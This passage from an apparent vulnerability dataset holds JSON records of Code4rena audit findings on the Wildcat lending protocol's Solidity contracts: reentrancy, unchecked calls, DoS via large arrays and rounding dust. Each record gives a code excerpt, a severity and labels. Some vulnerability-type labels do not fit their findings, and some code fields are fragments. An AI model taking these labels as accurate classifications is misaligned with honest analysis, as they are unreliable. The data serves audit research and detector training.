      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nIn the readToPointer function, there\u2019s a loop that reads transient data using keccak256 to calculate the storage slot of each subsequent data block. The loop does not have overflow protection, nor does it check for potential out-of-bound errors when reading large amounts of data.\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "## [L-10] Unchecked ``keccak256`` and ``for`` Loop in ``readToPointer``",
    "description": "In the readToPointer function, there\u2019s a loop that reads transient data using keccak256 to calculate the storage slot of each subsequent data block. The loop does not have overflow protection, nor does it check for potential out-of-bound errors when reading large amounts of data. FILE: 2024-08-wildcat/src/types/TransientBytesArray.sol let i := 0 for { } lt(i, length) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.284,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/WildcatArchController.sol\n\nfunction _updateSphereXEngineOnRegisteredContractsInSet(\n    EnumerableSet.AddressSet storage set,\n    address engineAddress,\n    address[] memory contracts,\n    bytes memory changeSphereXEngineCalldata,\n    bytes memory addAllowedSenderOnChainCalldata,\n    bytes4 notInSetErrorSelectorBytes\n  ) internal {\n    for (uint256 i = 0; i < contracts.length; i++) {\n      address account = contracts[i];\n      if (!set.contains(account)) {\n        uint32 notInSetErrorSelector = uint32(notInSetErrorSelectorBytes);\n        assembly {\n          mstore(0, notInSetErrorSelector)\n          revert(0x1c, 0x04)\n        }\n      }\n      _callWith(account, changeSphereXEngineCalldata);\n      if (engineAddress != address(0)) {\n        assembly {\n          mstore(add(addAllowedSenderOnChainCalldata, 0x24), account)\n        }\n        _callWith(engineAddress, addAllowedSenderOnChainCalldata);\n        emit_NewAllowedSenderOnchain(account);\n      }\n    }\n\n function _callWith(address target, bytes memory data) internal {\n    assembly {\n      if iszero(call(gas(), target, 0, add(data, 0x20), mload(data), 0, 0)) {\n        returndatacopy(0, 0, returndatasize())\n        revert(0, returndatasize())\n      }\n    }\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "## [L-11] Potential for Indirect Reentrancy in updateSphereXEngineOnRegisteredContracts() function",
    "description": "Even with access control, it's still important to consider reentrancy protections when dealing with low-level call() operations. Even if the ``call()`` target is controlled by a contract that implements access control, the reentrancy risk comes from how the external contract could behave. If the external contract (the ``target`` in ``_callWith``) is compromised or implements malicious logic, it can invoke other contracts or itself within the same transaction in ways that circumvent the access control. For instance, the external contract could call back into the original contract or exploit any other unprotected function. Example Scenario: The external contract A receives the call via call() and immediately calls back into the contract making the original call (WildcatArchController in this case). If the WildcatArchController has any other publicly accessible functions that don't have reentrancy protections, this callback could reenter those functions and cause unintended behavior. FILE: 2024-08-wildcat/src/WildcatArchController.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 40,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " pattern to ensure that state changes are made before any external calls. Additionally, consider using the ",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Recommended Mitigation",
    "description": "Apply the ``Checks-Effects-Interactions`` pattern to ensure that state changes are made before any external calls. Additionally, consider using the ``ReentrancyGuard`` from ``OpenZeppelin`` to prevent reentrant calls.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.107,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n A snippet of the Solidity documentation detailing unexpected behavior related to call\n\n\nIt is important to check whether the target address is a valid smart contract before performing a low-level call. Without this check, the call may fail if the target is an EOA or a non-existent contract, potentially causing unintended behavior.\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## [L-12] Lack of contract existence check when using assembly calls",
    "description": "The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. A snippet of the Solidity documentation detailing unexpected behavior related to call It is important to check whether the target address is a valid smart contract before performing a low-level call. Without this check, the call may fail if the target is an EOA or a non-existent contract, potentially causing unintended behavior.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.336,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/WildcatArchController.sol\n\n84: if (engineAddress != address(0)) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "## [L-13] Redundant address(0) Validation",
    "description": "The engineAddress is fetched from a predefined storage slot (SPHEREX_ENGINE_STORAGE_SLOT), which is set to hold a constant and valid address. Since this slot is guaranteed to contain a valid non-zero address, engineAddress can never be address(0). FILE: 2024-08-wildcat/src/WildcatArchController.sol 84: if (engineAddress != address(0)) { https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatArchController.sol#L84",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.102,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFILE:2024-08-wildcat/src/WildcatArchController.sol\n\nassembly {\n          mstore(0, notInSetErrorSelector)\n          revert(0x1c, 0x04)\n        }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "## [L-14] Brittle and Inefficient Assembly-based Custom Error Handling",
    "description": "The code uses assembly to revert with a custom error (revert(0x1c, 0x04)). This is inefficient and brittle for modern Solidity code. The usage of hardcoded memory offsets for error data (e.g., 0x1c and 0x04) could be incorrect if the error handling format changes, leading to unexpected behavior. FILE:2024-08-wildcat/src/WildcatArchController.sol assembly { mstore(0, notInSetErrorSelector) revert(0x1c, 0x04)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.155,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/WildcatArchController.sol\n\n function _callWith(address target, bytes memory data) internal {\n    assembly {\n      if iszero(call(gas(), target, 0, add(data, 0x20), mload(data), 0, 0)) {\n        returndatacopy(0, 0, returndatasize())\n        revert(0, returndatasize())\n      }\n    }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "## [L-15] Unrestricted Gas Forwarding in External Calls Leading to Potential Out-of-Gas Errors",
    "description": "The code does not control gas usage properly in the call() function in _callWith(). Since it forwards all available gas (gas()), it can potentially lead to out-of-gas errors in the calling contract if the target contract consumes excessive gas. FILE: 2024-08-wildcat/src/WildcatArchController.sol function _callWith(address target, bytes memory data) internal { assembly { if iszero(call(gas(), target, 0, add(data, 0x20), mload(data), 0, 0)) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.319,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/WildcatArchController.sol\n\nfunction getRegisteredBorrowers(\n    uint256 start,\n    uint256 end\n  ) external view returns (address[] memory arr) {\n    uint256 len = _borrowers.length();\n    end = MathUtils.min(end, len);\n    uint256 count = end - start;\n    arr = new address[](count);\n    for (uint256 i = 0; i < count; i++) {\n      arr[i] = _borrowers.at(start + i);\n    }\n  }\n\nfunction getBlacklistedAssets(\n    uint256 start,\n    uint256 end\n  ) external view returns (address[] memory arr) {\n    uint256 len = _assetBlacklist.length();\n    end = MathUtils.min(end, len);\n    uint256 count = end - start;\n    arr = new address[](count);\n    for (uint256 i = 0; i < count; i++) {\n      arr[i] = _assetBlacklist.at(start + i);\n    }\n  }\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## [L-16] Potential for DoS by returning overly large arrays",
    "description": "The arr array is created dynamically based on the count of assets to return, which could result in an overly large array if the difference between start and end is large. This can lead to excessive memory usage and higher gas costs, potentially causing the function to fail or making it cost-prohibitive to use. FILE: 2024-08-wildcat/src/WildcatArchController.sol function getRegisteredBorrowers( uint256 start, uint256 end",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 31,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.775,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/HooksFactory.sol\n\n constructor(\n    address archController_,\n    address _sanctionsSentinel,\n    address _marketInitCodeStorage,\n    uint256 _marketInitCodeHash\n  ) {\n    marketInitCodeStorage = _marketInitCodeStorage;\n    marketInitCodeHash = _marketInitCodeHash;\n    _archController = archController_;\n    sanctionsSentinel = _sanctionsSentinel;\n    __SphereXProtectedRegisteredBase_init(IWildcatArchController(archController_).sphereXEngine());\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "## [L-17] Lack of input validations when assigning values to immutable variables",
    "description": "The addresses passed to ``archController_``, ``_sanctionsSentinel``, and ``_marketInitCodeStorage`` are assigned directly without validation. If any of these addresses are incorrectly set (e.g., set to a zero address or malicious address), the contract might malfunction or become vulnerable to security exploits. ``_marketInitCodeHash`` is assigned directly without any validation or checks on the integrity or correctness of the input. If an incorrect hash is passed, the contract might fail to operate as expected, particularly in situations where market code initialization is critical. If the constructor allows external or untrusted parties to pass in values, it opens up a risk of malicious input, which could compromise the security or functionality of the contract. FILE: 2024-08-wildcat/src/HooksFactory.sol constructor(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.488,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/HooksFactory.sol\n\n function _deployMarket(\n    DeployMarketInputs memory parameters,\n    bytes memory hooksData,\n    address hooksTemplate,\n    HooksTemplate memory templateDetails,\n    bytes32 salt,\n    address originationFeeAsset,\n    uint256 originationFeeAmount\n  ) internal returns (address market) {\n    if (IWildcatArchController(_archController).isBlacklistedAsset(parameters.asset)) {\n      revert AssetBlacklisted();\n    }\n    address hooksInstance = parameters.hooks.hooksAddress();\n\n    if (!(address(bytes20(salt)) == msg.sender || bytes20(salt) == bytes20(0))) {\n      revert SaltDoesNotContainSender();\n    }\n\n    if (\n      originationFeeAsset != templateDetails.originationFeeAsset ||\n      originationFeeAmount != templateDetails.originationFeeAmount\n    ) {\n      revert FeeMismatch();\n    }\n\n    if (originationFeeAsset != address(0)) {\n      originationFeeAsset.safeTransferFrom(\n        msg.sender,\n        templateDetails.feeRecipient,\n        originationFeeAmount\n      );\n    }\n\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n\n    parameters.hooks = IHooks(hooksInstance).onCreateMarket(\n      msg.sender,\n      market,\n      parameters,\n      hooksData\n    );\n    uint8 decimals = parameters.asset.decimals();\n\n    string memory name = string.concat(parameters.namePrefix, parameters.asset.name());\n    string memory symbol = string.concat(parameters.symbolPrefix, parameters.asset.symbol());\n\n    TmpMarketParameterStorage memory tmp = TmpMarketParameterStorage({\n      borrower: msg.sender,\n      asset: parameters.asset,\n      packedNameWord0: bytes32(0),\n      packedNameWord1: bytes32(0),\n      packedSymbolWord0: bytes32(0),\n      packedSymbolWord1: bytes32(0),\n      decimals: decimals,\n      feeRecipient: templateDetails.feeRecipient,\n      protocolFeeBips: templateDetails.protocolFeeBips,\n      maxTotalSupply: parameters.maxTotalSupply,\n      annualInterestBips: parameters.annualInterestBips,\n      delinquencyFeeBips: parameters.delinquencyFeeBips,\n      withdrawalBatchDuration: parameters.withdrawalBatchDuration,\n      reserveRatioBips: parameters.reserveRatioBips,\n      delinquencyGracePeriod: parameters.delinquencyGracePeriod,\n      hooks: parameters.hooks\n    });\n    {\n      (tmp.packedNameWord0, tmp.packedNameWord1) = _packString(name);\n      (tmp.packedSymbolWord0, tmp.packedSymbolWord1) = _packString(symbol);\n    }\n\n    _setTmpMarketParameters(tmp);\n\n    if (market.code.length != 0) {\n      revert MarketAlreadyExists();\n    }\n    LibStoredInitCode.create2WithStoredInitCode(marketInitCodeStorage, salt);\n\n    IWildcatArchController(_archController).registerMarket(market);\n\n    _tmpMarketParameters.setEmpty();\n\n    _marketsByHooksTemplate[hooksTemplate].push(market);\n\n    emit MarketDeployed(\n      hooksTemplate,\n      market,\n      name,\n      symbol,\n      tmp.asset,\n      tmp.maxTotalSupply,\n      tmp.annualInterestBips,\n      tmp.delinquencyFeeBips,\n      tmp.withdrawalBatchDuration,\n      tmp.reserveRatioBips,\n      tmp.delinquencyGracePeriod,\n      tmp.hooks\n    );\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Issue",
    "description": "A race condition could occur if multiple market deployments are attempted simultaneously. Since the temporary market parameters are set in a shared storage variable (_tmpMarketParameters), two concurrent deployments could overwrite each other\u2019s data, leading to incorrect market initialization or corrupted data. FILE: 2024-08-wildcat/src/HooksFactory.sol function _deployMarket( DeployMarketInputs memory parameters, bytes memory hooksData,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 102,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE:2024-08-wildcat/src/market/WildcatMarket.sol\n\n38: if ((token == asset).or(token == address(this))) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "## [L-19] Logical Mistake in rescueTokens() function Conditional Check",
    "description": "using .or for the conditional check, which is incorrect for Solidity. FILE:2024-08-wildcat/src/market/WildcatMarket.sol 38: if ((token == asset).or(token == address(this))) { https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L38",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.116,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nThe issue arises when there is insufficient liquidity (availableLiquidity == 0) during withdrawal batch processing. This can lead to unprocessed or unpaid withdrawals, as the system may emit the WithdrawalBatchExpired event without properly handling the pending withdrawals, potentially leaving users unable to access their funds.\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "## [L-20] ``WithdrawalBatchExpired`` Event Emitted even if not Processing ``WithdrawalBatchPayment()``",
    "description": "The issue arises when there is insufficient liquidity (availableLiquidity == 0) during withdrawal batch processing. This can lead to unprocessed or unpaid withdrawals, as the system may emit the WithdrawalBatchExpired event without properly handling the pending withdrawals, potentially leaving users unable to access their funds. FILE: 2024-08-wildcat/src/market /WildcatMarketBase.sol emit_WithdrawalBatchExpired( expiry,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.334,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFILE:2024-08-wildcat/src/market/WildcatMarket.sol\n\n function depositUpTo(\n    uint256 amount\n  ) external virtual sphereXGuardExternal returns (uint256 /* actualAmount */) {\n    return _depositUpTo(amount);\n  }\n\nfunction deposit(uint256 amount) external virtual sphereXGuardExternal {\n    uint256 actualAmount = _depositUpTo(amount);\n    if (amount != actualAmount) revert_MaxSupplyExceeded();\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "## [L-21] Lack of reentrancy modifiers in critical functions depositUpTo(),deposit()",
    "description": "The functions depositUpTo() and deposit() handle critical operations such as transferring assets and minting tokens. Without proper reentrancy protection, an attacker could exploit these functions by calling them recursively before the state is fully updated. FILE:2024-08-wildcat/src/market/WildcatMarket.sol function depositUpTo( uint256 amount ) external virtual sphereXGuardExternal returns (uint256 /* actualAmount */) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.408,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/market/WildcatMarket.sol\n\n function collectFees() external nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n    if (state.accruedProtocolFees == 0) revert_NullFeeAmount();\n\n    uint128 withdrawableFees = state.withdrawableProtocolFees(totalAssets());\n    if (withdrawableFees == 0) revert_InsufficientReservesForFeeWithdrawal();\n\n    state.accruedProtocolFees -= withdrawableFees;\n    asset.safeTransfer(feeRecipient, withdrawableFees);\n    _writeState(state);\n    emit_FeesCollected(withdrawableFees);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "## [L-22] collectFees() function not followed the CEI Pattern",
    "description": "The function makes an external token transfer to feeRecipient before updating the internal state with _writeState(state). This violates the CEI pattern because it opens up a potential vulnerability where an attacker could exploit reentrancy through the external safeTransfer call, which may call back into the contract before the internal state is updated. FILE: 2024-08-wildcat/src/market/WildcatMarket.sol function collectFees() external nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState(); if (state.accruedProtocolFees == 0) revert_NullFeeAmount();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.581,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "soldiity\nFILE:2024-08-wildcat/src/WildcatSanctionsEscrow.sol\n\ncontract WildcatSanctionsEscrow is IWildcatSanctionsEscrow {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## [L-23] No Fallback Function for for WildcatSanctionsEscrow contract",
    "description": "The contract is designed for ERC-20 tokens (asset is treated as an ERC-20 token), but there\u2019s no mechanism to handle the escrow of native Ether. If someone sends Ether to this contract, it will be locked permanently. Accidental or malicious Ether transfers would cause the contract to hold Ether that cannot be recovered. FILE:2024-08-wildcat/src/WildcatSanctionsEscrow.sol contract WildcatSanctionsEscrow is IWildcatSanctionsEscrow { https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatSanctionsEscrow.sol#L9",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.124,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE:2024-08-wildcat/src/WildcatSanctionsEscrow.sol\n\nfunction releaseEscrow() public override {\n    if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n    uint256 amount = balance();\n    address _account = account;\n    address _asset = asset;\n\n    asset.safeTransfer(_account, amount);\n\n    emit EscrowReleased(_account, _asset, amount);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## [L-24] Risk of Failed Escrow Release Due to Blocklisted Recipient Address",
    "description": "Even the account unsanctioned its not possible to transfer escrow funds to account. releaseEscrow() function, there is a critical issue if the asset is a token that enforces blocklists, such as USDC or USDT. These tokens have an admin-controlled mechanism that blocks transfers to or from blocklisted addresses. If the account address is blocklisted, the transfer will fail.This can prevent escrow funds from being released as expected, leading to unexpected behavior or a stuck escrow situation. FILE:2024-08-wildcat/src/WildcatSanctionsEscrow.sol function releaseEscrow() public override { if (!canReleaseEscrow()) revert CanNotReleaseEscrow();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.357,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n// Rounding errors will lead to some dust accumulating in the batch, but the cost of\n// executing a withdrawal will be lower for users.\n  uint256 previousTotalWithdrawn = status.normalizedAmountWithdrawn;\n    uint256 newTotalWithdrawn = uint256(batch.normalizedAmountPaid).mulDiv(\n      status.scaledAmount,\n      batch.scaledTotalAmount\n    );\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "## [L-25]  ``getAvailableWithdrawalAmount()`` function potential to Dust Accumulation from Rounding Errors",
    "description": "In the ``getAvailableWithdrawalAmount`` function, there is a possibility of dust accumulation due to rounding errors during withdrawal calculations. The comment itself acknowledges this, but there is no mechanism to deal with the dust effectively: Over time, small amounts of dust could accumulate and may become unrecoverable, leading to accounting discrepancies. // Rounding errors will lead to some dust accumulating in the batch, but the cost of // executing a withdrawal will be lower for users. uint256 previousTotalWithdrawn = status.normalizedAmountWithdrawn;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.348,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nWhen calculating the withdrawal amount, we can store any dust (remainder) in the ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation",
    "description": "uint256 private dustBalance; When calculating the withdrawal amount, we can store any dust (remainder) in the ``dustBalance`` and handle it as needed.You can introduce a function that allows the contract owner or an automated process to sweep the dust and handle it appropriately.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.082,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/market/WildcatMarket.sol\n\n uint32 expiry = state.pendingWithdrawalExpiry;\n      WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n      if (batch.scaledAmountBurned < batch.scaledTotalAmount) {\n        (, uint128 normalizedAmountPaid) = _applyWithdrawalBatchPayment(\n          batch,\n          state,\n          expiry,\n          availableLiquidity\n        );\n        availableLiquidity -= normalizedAmountPaid;\n        _withdrawalData.batches[expiry] = batch;\n      }\n\n\n for (uint256 i; i < numBatches; i++) {\n      // Process the next unpaid batch using available liquidity\n      uint256 normalizedAmountPaid = _processUnpaidWithdrawalBatch(state, availableLiquidity);\n      // Reduce liquidity available to next batch\n      availableLiquidity -= normalizedAmountPaid;\n    }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "## [L-26] Inefficient Processing of Withdrawal Batches Due to Missing Available Liquidity Check",
    "description": "the system processes pending withdrawal batches and sets aside available liquidity to fulfill them. However, the code lacks a check to ensure that availableLiquidity is greater than 0 before attempting to allocate liquidity to a pending withdrawal batch. This can lead to unnecessary calculations and operations when there is no available liquidity, ultimately having no effect if availableLiquidity == 0. FILE: 2024-08-wildcat/src/market/WildcatMarket.sol uint32 expiry = state.pendingWithdrawalExpiry; WithdrawalBatch memory batch = _withdrawalData.batches[expiry]; if (batch.scaledAmountBurned < batch.scaledTotalAmount) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.826,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " Array\n\nAdds a new hooksTemplate to the _hooksTemplates array, but the array is defined as address[] internal, meaning it only allows adding new templates (pushing), not removing (popping). This could cause several issues if a hook becomes deprecated, malicious, or no longer needed.\n\nSpecifically, you won't be able to pop or remove deprecated hooks from the array, leading to the following risks:\n\n - Accumulation of Deprecated Hooks\n - Difficulty in Managing Hook Lifecycle\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## [L-27] Inability to Remove Deprecated Hook Templates from ``_hooksTemplates`` Array",
    "description": "Adds a new hooksTemplate to the _hooksTemplates array, but the array is defined as address[] internal, meaning it only allows adding new templates (pushing), not removing (popping). This could cause several issues if a hook becomes deprecated, malicious, or no longer needed. Specifically, you won't be able to pop or remove deprecated hooks from the array, leading to the following risks: - Accumulation of Deprecated Hooks - Difficulty in Managing Hook Lifecycle FILE: 2024-08-wildcat/src/HooksFactory.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.478,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " Allowed to Deploy New Markets, Violating ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "## [L-28] Sanctioned ``Borrowers`` Allowed to Deploy New Markets, Violating ``Protocol Compliance Guidelines``",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "WildcatArchController",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "L-03: Centralization Risk in Asset Blacklisting",
